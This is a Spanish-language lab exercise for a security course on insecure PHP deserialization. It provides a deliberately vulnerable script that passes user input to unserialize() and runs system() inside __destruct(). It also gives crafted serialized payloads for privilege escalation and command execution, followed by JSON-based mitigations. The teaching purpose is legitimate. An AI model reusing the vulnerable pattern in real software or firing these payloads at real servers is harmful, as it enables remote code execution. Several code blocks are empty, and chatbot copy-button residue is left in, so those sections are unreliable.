# PPS-Unidad3Actividad-DeserializacionInsegura
Explotación y Mitigación de vulnerabilidad de Deserialización Insegura
Tenemos como objetivo:

> - Ver cómo se pueden hacer ataques de Deserialización insegura.
>
> - Analizar el código de la aplicación que permite ataques de Deserialización insegura.
>
> - Explorar la deserialización insegura y mitigarlo con JSON
>
> - Implementar diferentes modificaciones del codigo para aplicar mitigaciones o soluciones.


## ¿Qué es Unsafe Deserialization?
---

La deserialización insegura ocurre cuando una aplicación carga objetos serializados sin validación, lo que permite que un atacante modifique los datos y ejecute código arbitrario.

Impacto de la Deserialización Insegura:

• Escalada de privilegios (ejemplo: convertir un usuario normal en administrador).

• Ejecución de código remoto (RCE) si la aplicación permite __wakeup() o __destruct().

• Modificación de datos internos en la aplicación.



## ACTIVIDADES A REALIZAR
---
> Lee detenidamente la sección de vulnerabilidades de subida de archivos.  de la página de PortWigger <https://portswigger.net/web-security/deserialization>
>
> Lee el siguiente [documento sobre Explotación y Mitigación de ataques de Remote Code Execution](./files/ExplotacionYMitigacionDeserializacionInsegura.pdf)
> 


Vamos realizando operaciones:

### Iniciar entorno de pruebas

-Situáte en la carpeta de del entorno de pruebas de nuestro servidor LAMP e inicia el esce>

~~~
docker-compose up -d
~~~


## Código vulnerable
---

La vulnerabilidad aparece debido a la creación de objetos, de manera que para pasar objetos a través de la red entre diferentes funciones serializamos los datos para que puedan ser transmitidos a través de dicho medio. 

La vulnerabilidad se explota en la deserialización de los datos de usuario sin validación (unserialize($_GET['data'])) y permite modificar el objeto y otorgar privilegios no autorizados.

Para mostrar las variables del objeto serializado vamos a crear un archivo vulnerable con nombre **MostrarObjeto.php** con el siguiente contenido:
~~~
  GNU nano 7.2                                                                           MostrarObjeto.php                                                                                    
<?php
class User {
    public $username;
    public $isAdmin = false;
    public $cmd;

    public function __destruct() {
        if (!empty($this->cmd)) {
            // echo "<pre>Ejecutando comando: {$this->cmd}\n";
            system($this->cmd);
            //echo "</pre>";
        }
    }
}

if (isset($_GET['data'])) {
    $data = $_GET['data'];
    $obj = @unserialize($data);

    echo "<h3>Objeto deserializado:</h3>";
    echo "<pre>";
    print_r($obj);
    echo "</pre>";

    // Opcional: forzar destrucci  n
    unset($obj);
} else {
    echo "No se proporciona  ningun dato.";
}
~~~

También vamos a crear un archivo con nombre GenerarObjeto.php
~~
<?php
class User {
    public $username;
    public $isAdmin = false;
}

$serialized = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user = new User();
    $user->username = $_POST['username'] ?? 'anon';
    $user->isAdmin = ($_POST['isAdmin'] ?? '0') === '1';

    $serialized = serialize($user);
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Generador de Objeto Serializado</title>
</head>
<body>
    <h2>Generar objeto serializado</h2>
    <form method="post">
        <label>Nombre de usuario:</label>
        <input type="text" name="username" required><br><br>

        <label>¿Administrador?</label>
        <select name="isAdmin">
            <option value="0">No</option>
            <option value="1">Sí</option>
        </select><br><br>

        <button type="submit">Generar</button>
    </form>

    <?php if ($serialized): ?>
        <h3>Objeto serializado:</h3>
        <textarea cols="80" rows="4"><?= htmlspecialchars($serialized) ?></textarea><br><br>

        <p>
            <strong>Enlace para probar:</strong><br>
            <a href="MostrarObjeto.php?data=<?= urlencode($serialized) ?>" target="_blank">
                MostrarObjeto.php?data=<?= htmlspecialchars(urlencode($serialized)) ?>
            </a>
        </p>
    <?php endif; ?>
</body>
</html>

**¿Qué te permite hacer esto?**

- Crear objetos User con isAdmin = true o false.

- Ver la cadena serializada.

- Probar directamente el exploit en tu script MostrarObjeto.php (o el que verifica isAdmin).


![](images/UD3.png)

Vemos como el objeto serializado sería: `O:4:"User":2:{s:8:"username";s:4:"Raul";s:7:"isAdmin";b:0;}`

y nos dá el enlace parar probarlo, enviándolo a MostrarObjeto.php

~~~
http://localhost/MostrarObjeto.php?data=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22Raul%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A0%3B%7D
~~~

![](images/UD4.pg)

~~~
##  Explotación de Deserialización Insegura
---

Por lo tanto a la hora de intercambiar objetos entre diferentes módulos, pasamos el objeto serializado.

Esto puede ser utilizado por atacantes, para enviar a nuestros códigos PHP la seriealización modificada.
 

**Crear un objeto malicioso en PHP**

![](images/UD5.png)

Como podemos ver, del enlace generado, cualquier persona puede saber, el nombre del tipo de objetos, variables y valores que tienen.

Por ejemplo, el usuario Raul podría:


**1 - Modificar la serialización**

El objeto serializado es: MostrarObjeto.php?data=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22Raul%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A**0**%3B%7D

Cambiar los datos del valor IsAdmin:

MostrarObjeto.php?data=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22Raul%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A**1**%3B%7D 

![](images/UD6.png)

Raul podría haber cambiado su estado, convirtiéndose en administrador.


**2 - Crear un archivo para crear la serialización con los datos que desee**

Crear el archivo **HackerAdmin.php**  y ejecutar este código en la máquina atacante:

~~~
<?php
class User {
	public $username = "hacker";
	public $isAdmin = true;
}
echo urlencode(serialize(new User()));
?>
~~~

Salida esperada (ejemplo):

~~~
O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22hacker%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A1%3B%7D
~~~

![](images/UD6.png)


- Copiar la salida obtenida

- Acceder a esta URL en el navegador `http://localhost/MostrarObjdeto.php?data=` y concatenarla con el código obtenido:


Al mandarlo, tendríamos el mismo resultado, Hacker se convierte en `Admin`.


~~~
http://localhost/MostrarObjdeto.php?data=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22hacker%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A1%3B%7D
~~


![](images/UD2.png)


**Intentar RCE con __destruct()**

Si la clase User tiene un método __destruct(), se puede abusar para ejecutar código en el servidor.

Aquí tenemos nuestra clase modificada con Destruct(). Crea el fichero **GenerarObjeto1.php**


~~~
<?php
class User {
    public $username;
    public $isAdmin = false;
    public $cmd;

    public function __destruct() {
        if (!empty($this->cmd)) {
            //echo "<pre>Ejecutando comando: {$this->cmd}\n";
            system($this->cmd);
            //echo "</pre>";
        }
    }
}
$serialized = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user = new User();
    $user->username = $_POST['username'] ?? 'anon';
    $user->isAdmin = ($_POST['isAdmin'] ?? '0') === '1';

    $serialized = serialize($user);
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Generador de Objeto Serializado</title>
</head>
<body>
    <h2>Generar objeto serializado</h2>
    <form method="post">
        <label>Nombre de usuario:</label>
        <input type="text" name="username" required><br><br>

        <label>¿Administrador?</label>
        <select name="isAdmin">
            <option value="0">No</option>
            <option value="1">Sí</option>
        </select><br><br>

        <button type="submit">Generar</button>
    </form>

    <?php if ($serialized): ?>
        <h3>Objeto serializado:</h3>
        <textarea cols="80" rows="4"><?= htmlspecialchars($serialized) ?></textarea><br><br>

        <p>
            <strong>Enlace para probar:</strong><br>
            <a href="MostrarObjeto1.php?data=<?= urlencode($serialized) ?>" target="_blank">
                MostrarObjeto.php?data=<?= htmlspecialchars(urlencode($serialized)) ?>
            </a>
        </p>
    <?php endif; ?>
</body>
</html>

~~~

Este cambio introduce:

- Una nueva propiedad $cmd que contendrá el comando a ejecutar.

- El método __destruct() que se dispara automáticamente al final del script (cuando el objeto es destruido), lo que lo hace perfecto para ilustrar la explotación por deserialización.

Vamos a modificar el objeto malicioso para introducir un código a ejecutar. El atacante de esta manera, podría serializar el objeto introduciendo un código para ejecutar en nuestro servidor, Este archivo lo llamo *explotarGenerarObjeto1.php**:

~~~
<?php
class User {
    public $username;
    public $isAdmin = false;
    public $cmd;

    public function __destruct() {
        if (!empty($this->cmd)) {
            // ⚠️ Ejecución insegura de código del sistema
            echo "<pre>Ejecutando comando: {$this->cmd}\n";
            system($this->cmd);
            echo "</pre>";
        }
    }
}

$serialized = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user = new User();
    $user->username = $_POST['username'] ?? 'anon';
    $user->isAdmin = ($_POST['isAdmin'] ?? '0') === '1';
    $user->cmd = $_POST['cmd'] ?? '';

    $serialized = serialize($user);
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Generador de Objeto Serializado</title>
</head>
<body>
    <h2>Generar objeto serializado con código ejecutable</h2>
    <form method="post">
        <label>Nombre de usuario:</label>
        <input type="text" name="username" required><br><br>

        <label>¿Administrador?</label>
        <select name="isAdmin">
            <option value="0">No</option>
            <option value="1">Sí</option>
        </select><br><br>

        <label>Comando a ejecutar (ej: <code>whoami</code>):</label><br>
        <input type="text" name="cmd" size="50"><br><br>

        <button type="submit">Generar</button>
    </form>

    <?php if ($serialized): ?>
        <h3>Objeto serializado:</h3>
        <textarea cols="80" rows="4"><?= htmlspecialchars($serialized) ?></textarea><br><br>

        <p>
            <strong>Enlace para probar:</strong><br>
            <a href="MostrarObjeto1.php?data=<?= urlencode($serialized) ?>" target="_blank">
                MostrarObjeto.php?data=<?= htmlspecialchars(urlencode($serialized)) ?>
            </a>
        </p>
    <?php endif; ?>
</body>
</html>
~~~

🧪 Para la prueba

1. Marca "Sí" en la opción de administrador.

2. Escribe un comando como whoami, ls -l, id, etc.

3. Se serializa el objeto incluyendo ese comando.

4. Al deserializarlo en MostrarObjeto.php, se ejecuta automáticamente en el __destruct().

![](images/UD7.png)

El atacante habría inyectado en la serialización la ejecución del comando `ls -l /tmp/output.txt`pero podría haber sido cualquier otro comando.

![](images/UD8.png)

Vemos en el resultado que la ejecución no parece anómalo, pero veamos que ha pasado en el servidor.

![](images/UD9.png)

Veamos que contiene el archivo `/tmp/output.txt`. 

Como nosotros extamos usando docker, o bien entramos dentros del servidor apacher y vemos el archivo, o ejecutamos el siguiente comando docker para que nos lo muestre:

~~~
docker exec -it lamp-php83 /bin/bash -c 'cat /tmp/output.txt'
~~~

![](images/UD10.png)

Como vemos, hemos podido ejecutar comandos dentro del servidor. En este caso con el usuario www-data, pero si lo combinamos con otros ataques como escalada de privilegios, podríamos haber ejecutado cualquier comando.
---

## Mitigación de Unsafe Deserialization
---

### Validación de datos:

Si queremos mitigar realmente ese problema (que no se puedan añadir propiedades inesperadas), una estrategia efectiva es usar la interfaz Serializable o __wakeup() junto con la visibilidad privada o protegida de las propiedades, y una validación explícita del contenido deserializado.

Aquí tienes una versión que:

- Usa propiedades privadas

- Implementa la interfaz Serializable

- Valida manualmente los datos antes de restaurarlos

- Impide que se inyecten propiedades no autorizadas

Escribimos **GenerarObjeto2.php**:


~~~


~~~
✅ ¿Qué mejora esta versión?

- No se pueden inyectar propiedades personalizadas, ya que solo se deserializa lo que explícitamente se espera.

- No hay ejecución de comandos.

- Control total de cómo se deserializa el objeto.

### Utilizando JSON 
---
La mejor forma de evitar ataques de deserialización insegura es NO usar unserialize() con datos externos.
Usar JSON en lugar de serialize().

Creamos el archivo **MostrarObjetoJson.php**:

~~~
~~~

Vamos a crear también el archivo php desde el que vamos a pasar datos en formato JSON para probar **GenerarObjetoJson.php**:

~~~

~~~
Ahora vemos como nos da error en el caso de que intentemos meter los objetos serializados en vez de mandarlos en forma de JSON.

![](images/UD11.png)

**Beneficios de Usar JSON**:
- json_decode() NO ejecuta código PHP, evitando RCE.
- Validación explícita de los datos, sin riesgo de objetos maliciosos.
- Mayor compatibilidad con APIs y aplicaciones en otros lenguajes.
- Evita la ejecución de métodos mágicos como __wakeup() y __destruct().


### ¿Cómo Validar aún más los datos?**
---
Si quieresmos reforzar aún más la seguridad, puedes validar los datos con una lista blanca. Para ello creamos el archivo **MostrarObjetofull.php**:
~~~
<?php
class User {
public $username;
public $isAdmin = false;
}
// Obtener y decodificar JSON de manera segura
$json = $_GET['data'] ?? '{}';
$data = json_decode($json, true);
// Validar que la decodificación haya sido correcta y que sea un array
if (!is_array($data)) {
die("Error: Formato de datos inválido.");
}
// Validación estricta de claves permitidas
$validKeys = ['username', 'isAdmin'];
foreach ($data as $key => $value) {
if (!in_array($key, $validKeys, true)) { // 'true' para comparación estricta
die("Error: Clave inválida detectada ('$key').");
}
}
// Validación estricta de tipo de datos
if (!isset($data['username']) || !is_string($data['username'])) {
die("Error: Username debe ser una cadena de texto.");
}
if (!isset($data['isAdmin']) || !is_bool($data['isAdmin'])) {
die("Error: isAdmin debe ser un booleano (true/false).");
}
// Verificación segura de acceso
if ($data['isAdmin'] === true) { // Comparación estricta
echo "¡Acceso de administrador concedido!";
} else {
echo "Acceso normal.";
}
?>
~~~

Esto previene la inyección de datos inesperados en el JSON.


**Explicación de la Validación de Claves**
---

Evita que el atacante agregue parámetros no esperados, como: 

~~~
http://localhost/deserialize_full.php?data={"username":"hacker","isAdmin":true, "bypass":"0"}
~~~

Si se detecta un parámetro no permitido (bypass en este caso), se muestra el error:

`Error: Clave inválida detectada`

Usar JSON en lugar de serialize()/unserialize() es una de las mejores formas de evitar la deserialización insegura, ya que JSON solo representa datos, no objetos con métodos o comportamientos.

Aquí te dejo el ejercicio modificado con mitigación basada en JSON, incluyendo validaciones:

🛡️ Parte 2 (alternativa): Código seguro usando JSON
✅ Código (seguro_json.php)
php
Copiar
Editar
<?php
class User {
    private $username;
    private $isAdmin = false;
    private $cmd;

    public function __construct($username, $isAdmin, $cmd) {
        $this->username = $username;
        $this->isAdmin = $isAdmin;
        $this->cmd = $cmd;
    }

    public function __toString() {
        return "Usuario: {$this->username}<br>" .
               "Es administrador: " . ($this->isAdmin ? "Sí" : "No") . "<br>" .
               "Comando: " . htmlspecialchars($this->cmd);
    }
}

if (isset($_GET['data'])) {
    $json = $_GET['data'];

    $data = json_decode($json, true);

    // Validación de estructura y tipos
    if (json_last_error() !== JSON_ERROR_NONE) {
        echo "JSON mal formado.";
        exit;
    }

    if (!isset($data['username'], $data['isAdmin'], $data['cmd']) ||
        !is_string($data['username']) ||
        !is_bool($data['isAdmin']) ||
        !is_string($data['cmd'])) {
        echo "Datos inválidos.";
        exit;
    }

    // Crear objeto validado
    $user = new User($data['username'], $data['isAdmin'], $data['cmd']);

    echo "<h3>Datos recibidos:</h3>";
    echo "<pre>{$user}</pre>";
} else {
    echo "No se proporciona ningún dato.";
}
🧪 Cómo probarlo
Crea el siguiente payload en un archivo payload.php:

php
Copiar
Editar
<?php
$data = [
    "username" => "alumno",
    "isAdmin" => true,
    "cmd" => "id" // esto no se ejecutará, solo se mostrará como texto
];
echo urlencode(json_encode($data));
Usa el resultado en el navegador así:

arduino
Copiar
Editar
http://localhost/seguro_json.php?data=[PAYLOAD]
✅ Ventajas de usar JSON
No permite ejecutar código, solo transportar datos.

No crea objetos automáticamente, por lo que no hay métodos mágicos como __destruct() que se ejecuten.

Es más legible y portable entre lenguajes.




La ejecución solo se permitirá si los datos contienen exclusivamente **username** y **isAdmin**.
![](images/UD.png)
![](images/UD.png)
![](images/UD.png)
![](images/UD.png)

Aquí está el código securizado:

🔒 Medidas de seguridad implementadas

- :

        - 

        - 



🚀 Resultado

✔ 

✔ 

✔ 

## ENTREGA

> __Realiza las operaciones indicadas__

> __Crea un repositorio  con nombre PPS-Unidad3Actividad6-Tu-Nombre donde documentes la realización de ellos.__

> No te olvides de documentarlo convenientemente con explicaciones, capturas de pantalla, etc.

> __Sube a la plataforma, tanto el repositorio comprimido como la dirección https a tu repositorio de Github.__

